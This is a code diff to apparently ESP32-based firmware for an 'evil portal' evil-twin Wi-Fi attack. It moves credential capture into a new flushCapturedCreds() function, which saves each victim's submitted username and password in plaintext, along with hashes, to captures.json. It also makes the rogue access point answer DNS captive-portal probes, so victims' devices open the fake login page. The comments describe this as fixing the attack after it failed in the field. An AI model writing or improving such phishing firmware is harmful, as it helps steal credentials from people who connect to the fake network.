@@ -694,66 +694,74 @@ void EvilPortal::main(uint8_t scan_mode) {
     
     server.handleClient();
     
-    if (this->name_received && this->password_received) {
-      this->name_received = false;
-      this->password_received = false;
-      
-      String hashed_user = this->getSHA256(this->user_name);
-      String hashed_pass = this->getSHA256(this->password);
-      
-      String logValue1 = "u: " + hashed_user;
-      String logValue2 = "p: " + hashed_pass;
-      String full_string = logValue1 + " " + logValue2 + "\n";
-      
-      Serial.println("[EP] RECORDING HASHED CREDENTIALS...");
-      Serial.print(full_string);
-      buffer_obj.append(full_string);
-      
-      // Save to SPIFFS for persistence across resets
-      {
-        // MED-5: enforce 8KB cap on captures.json to prevent SPIFFS exhaustion
-        static const size_t CAPTURES_MAX = 8192;
-        String existing = "";
-        if (SPIFFS.exists("/captures.json")) {
-          File rf = SPIFFS.open("/captures.json", "r");
-          existing = rf.readString();
-          rf.close();
-        }
-        // Build simple JSON array
-        if (existing.length() < 5) existing = "{\"captures\":[]}";
-        // Insert new entry before closing ]}
-        int pos = existing.lastIndexOf("]}");
-        if (pos > 0) {
-          String entry = "{\"user\":\"" + mgmtJsonEscape(this->user_name) +
-                         "\",\"pass\":\"" + mgmtJsonEscape(this->password) +
-                         "\",\"user_h\":\"" + hashed_user +
-                         "\",\"pass_h\":\"" + hashed_pass +
-                         "\",\"ap\":\"" + String(apName) +
-                         "\",\"t\":" + String(millis()/1000) + "}";
-          bool hasEntries = existing.indexOf("[{") > 0;
-          String updated = existing.substring(0, pos) +
-                          (hasEntries ? "," : "") + entry + "]}";
-          if (updated.length() > CAPTURES_MAX) {
-            Serial.println("[EP] WARN: captures.json would exceed 8KB cap, skipping save");
-          } else {
-            File wf = SPIFFS.open("/captures.json", "w");
-            if (!wf) {
-              Serial.println("[EP] ERROR: cannot open captures.json for write");
-            } else {
-              size_t written = wf.print(updated);
-              wf.close();
-              if (written == 0) Serial.println("[EP] ERROR: captures.json write failed");
-              else Serial.println("[EP] Capture saved to SPIFFS (" + String(updated.length()) + "B)");
-            }
-          }
+    this->flushCapturedCreds();
+  }
+}
+
+// Hash and persist a completed credential pair. Lifted out of main() so that
+// mainManagement() can run it too. main() is commented out of the sketch's
+// loop() on this build, so nothing ever consumed name_received /
+// password_received: every credential a victim submitted was accepted by the
+// web handler, held in RAM, and then silently dropped.
+void EvilPortal::flushCapturedCreds() {
+  if (!(this->name_received && this->password_received)) return;
+  this->name_received = false;
+  this->password_received = false;
+
+  String hashed_user = this->getSHA256(this->user_name);
+  String hashed_pass = this->getSHA256(this->password);
+
+  String logValue1 = "u: " + hashed_user;
+  String logValue2 = "p: " + hashed_pass;
+  String full_string = logValue1 + " " + logValue2 + "\n";
+
+  Serial.println("[EP] RECORDING HASHED CREDENTIALS...");
+  Serial.print(full_string);
+  buffer_obj.append(full_string);
+
+  // Save to SPIFFS for persistence across resets
+  {
+    // MED-5: enforce 8KB cap on captures.json to prevent SPIFFS exhaustion
+    static const size_t CAPTURES_MAX = 8192;
+    String existing = "";
+    if (SPIFFS.exists("/captures.json")) {
+      File rf = SPIFFS.open("/captures.json", "r");
+      existing = rf.readString();
+      rf.close();
+    }
+    // Build simple JSON array
+    if (existing.length() < 5) existing = "{\"captures\":[]}";
+    // Insert new entry before closing ]}
+    int pos = existing.lastIndexOf("]}");
+    if (pos > 0) {
+      String entry = "{\"user\":\"" + mgmtJsonEscape(this->user_name) +
+                     "\",\"pass\":\"" + mgmtJsonEscape(this->password) +
+                     "\",\"user_h\":\"" + hashed_user +
+                     "\",\"pass_h\":\"" + hashed_pass +
+                     "\",\"ap\":\"" + String(apName) +
+                     "\",\"t\":" + String(millis()/1000) + "}";
+      bool hasEntries = existing.indexOf("[{") > 0;
+      String updated = existing.substring(0, pos) +
+                      (hasEntries ? "," : "") + entry + "]}";
+      if (updated.length() > CAPTURES_MAX) {
+        Serial.println("[EP] WARN: captures.json would exceed 8KB cap, skipping save");
+      } else {
+        File wf = SPIFFS.open("/captures.json", "w");
+        if (!wf) {
+          Serial.println("[EP] ERROR: cannot open captures.json for write");
+        } else {
+          size_t written = wf.print(updated);
+          wf.close();
+          if (written == 0) Serial.println("[EP] ERROR: captures.json write failed");
+          else Serial.println("[EP] Capture saved to SPIFFS (" + String(updated.length()) + "B)");
         }
       }
-      
-      #ifdef HAS_SCREEN
-        this->sendToDisplay("Data Hashed & Saved");
-      #endif
     }
   }
+
+  #ifdef HAS_SCREEN
+    this->sendToDisplay("Data Hashed & Saved");
+  #endif
 }
 
 // ── PASSIVE HANDSHAKE CAPTURE (static storage) ────────────────
@@ -3121,6 +3129,22 @@ void EvilPortal::mainManagement() {
   // Serve HTTP only while the management AP is actually up.
   if (this->management_active) {
     server.handleClient();
+  }
+  // Evil twin servicing. EvilPortal::main() is where the original firmware
+  // pumped DNS and consumed captured credentials, and it is commented out of
+  // the sketch's loop() on this build. So during an evil twin the DNS server
+  // was started and then never asked to answer a single query: the victim got
+  // an address from DHCP, the phone's captive-portal probe went unanswered,
+  // and the phone concluded there was no internet instead of opening the
+  // login page. An access point that hands out an IP and shows no portal -
+  // exactly what was reported from the field.
+  //
+  // HTTP itself needs no extra call here: management_active deliberately stays
+  // true through the attack, so handleClient() above already services the
+  // portal's routes, which setupServer() re-registered.
+  if (this->mgmt_job_kind == "eviltwin" && this->has_ap && this->has_html) {
+    this->dnsServer.processNextRequest();
+    this->flushCapturedCreds();
   }
   // Advance the job state machine ALWAYS — never gate this on
   // management_active. The BLE path tears the radio down and clears that flag
